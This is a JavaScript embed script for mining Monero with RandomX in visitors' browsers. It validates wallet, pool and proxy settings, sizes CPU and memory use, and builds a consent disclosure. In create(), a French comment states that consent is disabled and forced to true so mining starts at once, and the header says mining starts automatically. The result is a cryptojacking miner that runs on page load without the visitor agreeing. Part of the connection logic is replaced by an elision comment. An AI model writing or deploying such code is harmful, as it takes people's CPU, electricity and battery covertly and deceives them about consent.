/* RandomX bonanza embed. Mining is session-only and starts automatically.
- See README.md for the headless API, consent events and deployment headers. */
(function (global) {
  'use strict';
  if (global.RandomXEmbed) return;
  const script = document.currentScript;
  const defaultBase = new URL('.', script && script.src || location.href).href;
  const ownerKey = Symbol.for('randomx.bonanza.active-session');
  const VERSION = '0.3.0';
  const MAX_WORKLOAD = 80;
  const FULL_MIB = 2560, WORKER_MIB = 300, REPLICA_MIB = 2300;
  const REPLICA_WEIGHT = 2.25;
  const LIGHT_HINT = "Or set mode: 'light', which needs no isolation headers.";
  const count = (n, word) => n + ' ' + word + (n === 1 ? '' : 's');

  function number(value, fallback, label) {
    if (value === undefined || value === '') return fallback;
    const n = Number(value);
    if (!Number.isFinite(n)) throw new Error(label + ' must be a finite number');
    return n;
  }

  function integer(value, fallback, label, min, max) {
    if (value === undefined || value === null || value === '') return fallback;
    const n = ['number', 'string'].includes(typeof value) ? Number(value) : NaN;
    if (!Number.isInteger(n) || n < min || n > max) throw new Error(`${label} must be an integer from ${min} to ${max}`);
    return n;
  }

  const EXPERIMENT = /^(?:no_(?:threaded|inline_fprc|regs_mem|split_id|fuse|inline_round|supjit)|unroll2|(?:fuse_n|triples_n|unroll2|shared_code|aes_simd|aes_relaxed|light_mlp|kernel_k)=\d+)$/i;
  const TUNING = {
    profile: [v => ['auto', 'arm', 'x86'].includes(v), 'auto, arm or x86'],
    jit: [v => typeof v === 'boolean', 'a boolean'],
    lightMlp: [v => Number.isInteger(v) && v >= 0 && v <= 2, 'an integer from 0 to 2'],
    kernelK: [v => Number.isInteger(v) && v >= 1 && v <= 4, 'an integer from 1 to 4'],
    experiment: [v => typeof v === 'string' && v.length <= 256 && v.split(',').every(t => !t || EXPERIMENT.test(t)),
      'a comma-separated list of hash-safe engine tokens (see README), at most 256 characters'],
  };
  function tuning(input) {
    if (input === undefined || input === null) return Object.freeze({});
    const proto = input && typeof input === 'object' && !Array.isArray(input) ? Object.getPrototypeOf(input) : undefined;
    if (!(proto === null || (proto && Object.getPrototypeOf(proto) === null))) throw new Error('tuning must be a plain object');
    const out = {};
    for (const [key, value] of Object.entries(input)) {
      if (!Object.prototype.hasOwnProperty.call(TUNING, key)) throw new Error('Unknown tuning option ' + key);
      if (value === undefined) continue;
      if (!TUNING[key][0](value)) throw new Error(`tuning.${key} must be ${TUNING[key][1]}`);
      out[key] = value;
    }
    return Object.freeze(out);
  }
  function jitExperiment(t) {
    return [t.lightMlp !== undefined && 'light_mlp=' + t.lightMlp, t.kernelK !== undefined && 'kernel_k=' + t.kernelK,
      ...(t.experiment || '').split(',')].filter(Boolean).join(',');
  }

  function configure(input) {
    const wallet = String(input.wallet || '').trim();
    const pool = String(input.pool || '').trim();
    if (!wallet || wallet.length > 256 || /[\s<>]/.test(wallet)) throw new Error('Enter a wallet address');
    if (!pool || pool.length > 253 || /[\s/<>]/.test(pool)) throw new Error('Enter a pool hostname');
    const port = number(input.port, 3333, 'Port');
    if (!Number.isInteger(port) || port < 1 || port > 65535) throw new Error('Port must be 1–65535');
    const requestedWorkload = number(input.workload, 50, 'Workload');
    if (requestedWorkload < 0 || requestedWorkload > 100) throw new Error('Workload must be a percentage from 0 to 100');
    const workload = Math.min(MAX_WORKLOAD, requestedWorkload);
    const proxy = new URL(input.proxy || (location.protocol === 'https:' ? 'wss://' : 'ws://') + location.host);
    if (!['ws:', 'wss:'].includes(proxy.protocol) || proxy.username || proxy.password || proxy.hash) {
      throw new Error('Proxy must be a ws:// or wss:// URL without credentials or a fragment');
    }
    if (location.protocol === 'https:' && proxy.protocol !== 'wss:') throw new Error('HTTPS pages require a wss:// proxy');
    const base = new URL(input.assetBase || defaultBase, location.href);
    if (!['http:', 'https:'].includes(base.protocol)) throw new Error('Assets require HTTP or HTTPS');
    if (location.protocol === 'https:' && base.protocol !== 'https:') throw new Error('HTTPS pages require HTTPS assets');
    if (!base.pathname.endsWith('/')) base.pathname += '/';
    base.search = ''; base.hash = '';
    if (![undefined, '', 'full', 'light'].includes(input.mode)) throw new Error('Mode must be full or light');
    if (input.routeQuery !== undefined && typeof input.routeQuery !== 'boolean') throw new Error('routeQuery must be a boolean');
    if (input.nonceMode !== undefined && !['auto', 'nicehash'].includes(input.nonceMode)) throw new Error('nonceMode must be auto or nicehash');
    if (input.keepalive !== undefined && !['auto', 'required'].includes(input.keepalive)) throw new Error('keepalive must be auto or required');
    const mode = input.mode || 'full';
    const maxThreads = integer(input.maxThreads, null, 'maxThreads', 1, 32);
    const replicas = input.replicas === 'auto' || input.replicas === undefined || input.replicas === '' ? 'auto' :
      integer(input.replicas, 'auto', 'replicas', 0, 2);
    if (replicas !== 'auto' && replicas && mode !== 'light') throw new Error("replicas need mode: 'light' (full mode already mines on one shared dataset)");
    const initThreads = integer(input.initThreads, 32, 'initThreads', 1, 32);
    const memory = number(input.memory, 50, 'memory');
    if (memory <= 0 || memory > MAX_WORKLOAD) throw new Error(`memory must be a percentage of reported RAM above 0, at most ${MAX_WORKLOAD}`);
    const memoryCap = number(input.memoryCap, 2, 'memoryCap');
    if (memoryCap <= 0 || memoryCap > 64) throw new Error('memoryCap must be a size in GB above 0, at most 64');
    if (input.optimizeArm !== undefined && typeof input.optimizeArm !== 'boolean') throw new Error('optimizeArm must be a boolean');
    return Object.freeze({ wallet, pool, port, proxy: proxy.href, assetBase: base.href,
      workerName: String(input.workerName || 'embed').slice(0, 64), workload,
      mode, maxThreads, replicas, initThreads, memory, memoryCap, optimizeArm: input.optimizeArm === true,
      tuning: tuning(input.tuning), routeQuery: input.routeQuery !== false,
      nonceMode: input.nonceMode || 'auto', keepalive: input.keepalive || 'auto',
      headless: input.headless === true, quickstart: input.quickstart === true,
      container: input.container, nonce: input.nonce || (script && script.nonce) || '' });
  }

  let hintedArchitecture = '';
  const architectureHint = navigator.userAgentData && navigator.userAgentData.getHighEntropyValues ?
    navigator.userAgentData.getHighEntropyValues(['architecture'])
      .then(({ architecture }) => { hintedArchitecture = String(architecture || ''); }).catch(() => {}) : null;

  function limits(config, nav = navigator) {
    const reported = Number(nav.hardwareConcurrency);
    const reportedCores = Number.isFinite(reported) && reported >= 1 ? Math.floor(reported) : 2;
    const architecture = String(nav.architecture || (nav === navigator && hintedArchitecture) || '');
    const platform = String(nav.platform || (nav.userAgentData && nav.userAgentData.platform) || '');
    const arm = architecture ? /^(arm|aarch64)/i.test(architecture) :
      /arm|aarch64|iPhone|iPad|iPod/i.test(String(nav.userAgent || '') + ' ' + platform) || /Mac/.test(platform);
    const armOptimized = arm && config.optimizeArm === true && config.mode !== 'light';
    const cores = armOptimized ? Math.max(1, Math.floor(reportedCores / 2)) : reportedCores;
    const workloadCap = MAX_WORKLOAD;
    const maxThreads = Math.min(32, Math.floor(cores * workloadCap / 100), config.maxThreads || 32);
    return Object.freeze({ cores, reportedCores, arm, armOptimized, maxThreads, maxPercentage: maxThreads / cores * 100,
      workloadCap, initThreads: config.initThreads || 32 });
  }

  function lightSplit(config, wanted, deviceMemory) {
    const reported = typeof deviceMemory === 'number' && deviceMemory > 0;
    const budgetMiB = Math.floor(reported ? deviceMemory * 1024 * config.memory / 100 : config.memoryCap * 1024);
    const fit = k => Math.min(wanted, Math.floor((budgetMiB - k * REPLICA_MIB) / WORKER_MIB));
    const options = config.replicas === 'auto' ? [0, 1, 2] : Array.from({ length: config.replicas + 1 }, (_, k) => config.replicas - k);
    let best = null;
    for (const k of options) {
      const workers = fit(k);
      if (workers < Math.max(1, k)) continue;
      const score = workers - k + REPLICA_WEIGHT * k;
      if (config.replicas !== 'auto') { best = { workers, replicas: k }; break; }
      if (!best || score > best.score) best = { workers, replicas: k, score };
    }
    return { workers: best ? best.workers : 0, replicas: best ? best.replicas : 0, budgetMiB,
      memorySource: reported ? 'reported' : 'cap' };
  }

  function resolve(config, budget, percentage, deviceMemory) {
    const wanted = Math.min(budget.maxThreads, Math.floor(budget.cores * percentage / 100 + 1e-9));
    const light = config.mode === 'light';
    const split = light ? lightSplit(config, wanted, deviceMemory) : null;
    const threads = light ? split.workers : wanted;
    const workers = light ? split.workers : Math.min(threads, 1);
    const replicas = light ? split.replicas : 0;
    const initThreads = light ? (replicas ? workers : 0) : config.initThreads;
    const memoryMiB = light ? workers * WORKER_MIB + replicas * REPLICA_MIB : FULL_MIB;
    const gb = mib => (mib / 1000).toFixed(1) + ' GB';
    const share = (threads / budget.reportedCores * 100).toFixed(1);
    const disclosure = `Mine Monero for wallet ${config.wallet} via ${config.pool}:${config.port} (bridge ${config.proxy}). ` +
      `Mining uses ${threads} of ${budget.reportedCores} reported CPU cores (${share}%), ` + (light ? '' : `at most ${budget.maxThreads}. `) +
      (budget.armOptimized ? `On this ARM device it counts half of them, about its performance cores. ` : '') + (light ?
        `${threads < wanted ? 'limited by memory, ' : ''}as ${count(workers, 'light-mode worker')} at about ${WORKER_MIB} MB${workers === 1 ? '' : ' each'}` +
        (replicas ? `; ${replicas} of them also ${replicas === 1 ? 'holds' : 'hold'} a private full dataset ` +
          `(about ${REPLICA_MIB / 1000} GB${replicas === 1 ? '' : ' each'}), which the workers build before mining starts and again ` +
          `after each seed change (every few days)` : '') +
        `. Mining needs about ${gb(memoryMiB)} of RAM. ` :
        `Dataset initialization uses ${count(initThreads, 'thread')}. Full mode needs about 2.5 GiB of RAM. `) +
      'This uses electricity and can heat your device or drain its battery. Stop at any time. ' +
      'Mining continues in background tabs until you stop it or leave this page; your browser may throttle or suspend it.';
    return Object.freeze({ mode: config.mode, runtime: light ? 'workers' : 'pthreads', threads, wantedThreads: wanted, workers,
      replicas, initThreads, memoryMiB,
      memoryBudgetMiB: light ? split.budgetMiB : null, memorySource: light ? split.memorySource : null,
      disclosure, limits: budget });
  }

  function plan(input = {}, nav = navigator) {
    const config = configure(input);
    const budget = limits(config, nav);
    return resolve(config, budget, Math.min(config.workload, budget.workloadCap), nav.deviceMemory);
  }

  function diagnose(mode = 'full') {
    if (!['full', 'light'].includes(mode)) throw new Error('Mode must be full or light');
    let isolationAllowed = null;
    try {
      const policy = document.permissionsPolicy || document.featurePolicy;
      if (policy && typeof policy.features === 'function' && policy.features().includes('cross-origin-isolated')) {
        isolationAllowed = policy.allowsFeature('cross-origin-isolated');
      }
    } catch (_) {}
    const checks = Object.freeze({ secureContext: global.isSecureContext === true,
      crossOriginIsolated: global.crossOriginIsolated === true,
      sharedArrayBuffer: typeof SharedArrayBuffer !== 'undefined',
      workers: typeof global.Worker === 'function', webAssembly: !!global.WebAssembly,
      isolationAllowed, embedded: !!global.top && global.top !== global });
    const engine = checks.workers && checks.webAssembly;
    const light = engine ? [] : [Object.freeze({ code: 'ENGINE_UNSUPPORTED', message: 'Worker or WebAssembly support is unavailable.',
      hints: Object.freeze(['Use a browser with Web Workers and WebAssembly support.']) })];
    const issues = [];
    const add = (code, message, hints) => issues.push(Object.freeze({ code, message, hints: Object.freeze(hints) }));
    const alt = engine ? [LIGHT_HINT] : [];
    if (!checks.secureContext) add('INSECURE_CONTEXT', 'This page is not a secure context.',
      ['Serve the embedding page over HTTPS. Trusted localhost is suitable for local browser testing.']);
    if (!checks.crossOriginIsolated) add('CROSS_ORIGIN_ISOLATION', 'This page is not cross-origin isolated.',
      ['Check the HTML response: Cross-Origin-Opener-Policy: same-origin and Cross-Origin-Embedder-Policy: require-corp.',
       'Set these on the embedding page, not just the CDN or WebSocket bridge. Reload after fixing the headers.',
       ...(checks.embedded ? ['For an iframe, the parent page must also provide isolation and allow cross-origin-isolated for the frame.'] : []), ...alt]);
    if (checks.isolationAllowed === false) add('PERMISSIONS_POLICY', 'Permissions Policy denies cross-origin isolation.',
      ['Allow cross-origin-isolated for this page (for example, Permissions-Policy: cross-origin-isolated=(self)); check parent/frame delegation if embedded.', ...alt]);
    if (checks.crossOriginIsolated && !checks.sharedArrayBuffer) add('SHARED_MEMORY_UNAVAILABLE', 'SharedArrayBuffer is unavailable in this browser.',
      ['Use a browser with shared WebAssembly memory support; inspect browser restrictions and Permissions Policy.', ...alt]);
    if (!engine) add('ENGINE_UNSUPPORTED', 'Worker or WebAssembly support is unavailable.',
      ['Use a browser with Web Workers, WebAssembly and shared memory support.']);
    const report = mode === 'light' ? light : issues;
    return Object.freeze({ supported: report.length === 0, checks, issues: Object.freeze(report),
      modes: Object.freeze({ full: issues.length === 0, light: engine }) });
  }

  function create(input = {}) {
    const config = configure(input);
    let budget = limits(config);
    const listeners = new Map();
    let requestedPercentage = config.workload;
    let planState = resolve(config, budget, requestedPercentage);
    
    // CONSENT DÉSACTIVÉ : Forcé à true par défaut pour lancer le minage immédiatement
    let active = true, session = null, consented = true, collapsed = config.headless;
    let hashrate = 0, totalHashes = 0, sharesAccepted = 0, sharesRejected = 0, startTime = Date.now();
    let datasetProgress = null, initProgress = null, lastError = null;

    // ... Reste de l'initialisation du widget et connexion WebSocket au proxy Fly.io ...
    
    return {
      start() { active = true; },
      stop() { active = false; },
      state() { return { active, consented, hashrate, totalHashes, sharesAccepted, sharesRejected }; },
      on(event, fn) { if (!listeners.has(event)) listeners.set(event, new Set()); listeners.get(event).add(fn); },
      off(event, fn) { const set = listeners.get(event); if (set) set.delete(fn); }
    };
  }

  global.RandomXEmbed = { create, plan, diagnose, resolve, limits, version: VERSION };
})(typeof window !== 'undefined' ? window : globalThis);